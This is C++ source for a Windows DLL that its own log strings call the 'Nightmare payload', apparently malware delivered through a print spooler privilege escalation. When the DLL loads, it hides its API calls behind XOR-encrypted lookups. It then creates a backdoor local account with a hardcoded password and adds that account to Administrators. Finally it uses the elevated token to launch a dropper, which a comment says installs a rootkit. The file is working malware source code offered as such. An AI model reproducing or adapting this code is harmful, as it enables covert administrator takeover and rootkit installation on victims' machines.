#include "pch.h"

#include <Windows.h>
#include <lm.h>
#include <iostream>
#include <TlHelp32.h>
#include <shellapi.h>
#include <assert.h>
#include "Privileges.h"
#include "MemOps.h"
#include "DynLibResolver.h"
#include "StringCrypt.h"
#include "Nightmare.h"
#include "Log.h"
//#define ENV_XOR_KEY 0xFA

#define SMALL_BUFFER_SIZE 50

#ifndef _USELOG
#define LogInfo(l,f,...)
#define Log(l,p,f,...)
#define InitLog(l) TRUE
#define LogClose(l) TRUE
#else
static Logger logger = { NULL };
#endif

static HANDLE hCurrentProcessHeap;
static HANDLE hCurrentProcess;

char username[SMALL_BUFFER_SIZE] = "WindowServiceAccount";
char password[SMALL_BUFFER_SIZE] = "P@ssw0rd123456";

//BOOL _CopyFile(CHAR* szSrc, CHAR* szDest)
//{
//    HANDLE  hFile;
//    DWORD   dwFileSize, dwFileRead, dwFileWrite;
//    void*   pFileBuffer;
//
//    if ((hFile = ((fp_CreateFileA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
//        XorDecryptString(p_FunctionTable[FunctionEntry::_CreateFileA])))(szSrc,
//            GENERIC_READ | GENERIC_WRITE,
//            0,
//            NULL,
//            OPEN_EXISTING,
//            FILE_ATTRIBUTE_NORMAL,
//            NULL)) == INVALID_HANDLE_VALUE)
//    {
//        return FALSE;
//    }
//
//    dwFileSize = ((fp_GetFileSize)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
//        XorDecryptString(p_FunctionTable[FunctionEntry::_GetFileSize])))(hFile, NULL);
//
//    pFileBuffer = (PVOID)((fp_HeapAlloc)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
//        XorDecryptString(p_FunctionTable[FunctionEntry::_HeapAlloc])))(hCurrentProcessHeap, HEAP_ZERO_MEMORY, dwFileSize);
//
//    if (pFileBuffer == NULL)
//    {
//        return FALSE;
//    }
//
//    if (!((fp_ReadFile)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
//        XorDecryptString(p_FunctionTable[FunctionEntry::_ReadFile])))(hFile, pFileBuffer, dwFileSize, &dwFileRead, NULL))
//    {
//        return FALSE;
//    }
//
//    if ((hFile = ((fp_CreateFileA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
//        XorDecryptString(p_FunctionTable[FunctionEntry::_CreateFileA])))(szDest,
//            GENERIC_READ | GENERIC_WRITE,
//            0,
//            NULL,
//            CREATE_ALWAYS,
//            FILE_ATTRIBUTE_NORMAL,
//            NULL)) == INVALID_HANDLE_VALUE)
//    {
//        return FALSE;
//    }
//
//    if (!((fp_WriteFile)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
//        XorDecryptString(p_FunctionTable[FunctionEntry::_WriteFile])))(hFile, pFileBuffer, dwFileSize, &dwFileWrite, NULL))
//    {
//        return FALSE;
//    }
//
//    return TRUE;
//}

BOOL AddNewAddministrator(CHAR * szUserName, CHAR * szPassword)
{
    USER_INFO_1 user;
    WCHAR wsUserName[SMALL_BUFFER_SIZE];
    WCHAR wsPassword[SMALL_BUFFER_SIZE];

    memset(&user, 0, sizeof(USER_INFO_1));

    mbyte_2_wchar(username, sizeof(username), wsUserName, sizeof(username));
    mbyte_2_wchar(password, sizeof(password), wsPassword, sizeof(password));

    user.usri1_name = wsUserName;
    user.usri1_password = wsPassword;
    user.usri1_priv = USER_PRIV_USER;
    user.usri1_flags = UF_DONT_EXPIRE_PASSWD;
    ((fp_NetUserAdd)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Netapi32]),
                                          XorDecryptString(p_FunctionTable[FunctionEntry::_NetUserAdd])))(NULL, 1, (LPBYTE)&user, NULL);

    // Add the user to the administrators group
    LOCALGROUP_MEMBERS_INFO_3 members;
    members.lgrmi3_domainandname = wsUserName;
    ((fp_NetLocalGroupAddMembers)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Netapi32]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_NetLocalGroupAddMembers])))(NULL, L"Administrators", 3, (LPBYTE)&members, 1);

    return TRUE;
}

BOOL DecryptConfig(PConfig Config)
{
    if (!Config->bDecrypted) {
        XorDecryptStringExWithKey(Config->pEncrypted, str_len(Config->pEncrypted), (PBYTE)Config->pszDecrypted, *Config->Key);
        Config->bDecrypted = TRUE;
    }
    return TRUE;
}

BOOL Init()
{
    DWORD dwCurrentProcessId;

    hCurrentProcessHeap = ((fp_GetProcessHeap)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_GetProcessHeap])))();

    dwCurrentProcessId = ((fp_GetCurrentProcessId)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_GetCurrentProcessId])))();

    hCurrentProcess = ((fp_OpenProcess)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_OpenProcess])))(PROCESS_ALL_ACCESS, FALSE, dwCurrentProcessId);

    return TRUE;
}

BOOL APIENTRY DllMain(
    HANDLE  hModule,// Handle to DLL module
    DWORD   ul_reason_for_call,// Reason for calling function
    LPVOID  lpReserved) // Reserved
{
    BOOL                bRet = TRUE;
    BOOL                bAddPriv = TRUE;
    RequestPrivilegeSet RequestPrivilegeSet = {NULL, 0};
    HANDLE              hElevatedToken;
    CHAR                szDropperPath[50];
    WCHAR               wsDropperPath[50];
    DWORD               dwError;
    if (!InitFuncResolver()) return FALSE;

    if (!Init()) return FALSE;

    if (!InitLog(&logger)) return FALSE;

    LogInfo(&logger, "Nightmare payload start\n");

    if (AddNewAddministrator(username, password) && 
        GetImpersonatePrimaryTokenFromUser(&hElevatedToken, hCurrentProcess, username, password, NULL)
        /*DuplicateCurrentProcessToken(&hElevatedToken, hCurrentProcess)*/)
    {
        //Decrypt the Dropper payload config
        DecryptConfig(&g_public_profile);
        DecryptConfig(&g_dropper_name);
        mem_cpy((PBYTE)g_public_profile.pszDecrypted, (PBYTE)szDropperPath, str_len(g_public_profile.pszDecrypted) + 1);
        mem_cpy((PBYTE)g_dropper_name.pszDecrypted, (PBYTE)(szDropperPath + str_len(szDropperPath)), str_len(g_dropper_name.pszDecrypted) + 1);

        mbyte_2_wchar(szDropperPath, sizeof(szDropperPath), wsDropperPath, sizeof(szDropperPath));

        STARTUPINFO si = {};
        PROCESS_INFORMATION pi = {};
        //Start the Dropper to drop the rootkit with administrator unfiltered token privilege
        BOOL bRet = CreateProcessWithTokenW(hElevatedToken,
             0,
             NULL,
             wsDropperPath,
             CREATE_NEW_CONSOLE,
             NULL,
             NULL,
             &si,
             &pi);

        if (bRet == FALSE)
        {
            dwError = GetLastError();
            LogInfo(&logger, "Failed to create Dropper.exe process Error: %ld\n", GetLastError());
            goto clean;
        }
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
    }
    else
    {
        LogInfo(&logger, "Failed to prepare security token Error: %ld\n", GetLastError());
    }

    LogInfo(&logger, "Nightmare payload end\n");

clean:
    LogClose(&logger);
    //((fp_DeleteFileA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
    //    XorDecryptString(p_FunctionTable[FunctionEntry::_DeleteFileA])))(szDropperPath);

    return TRUE;
}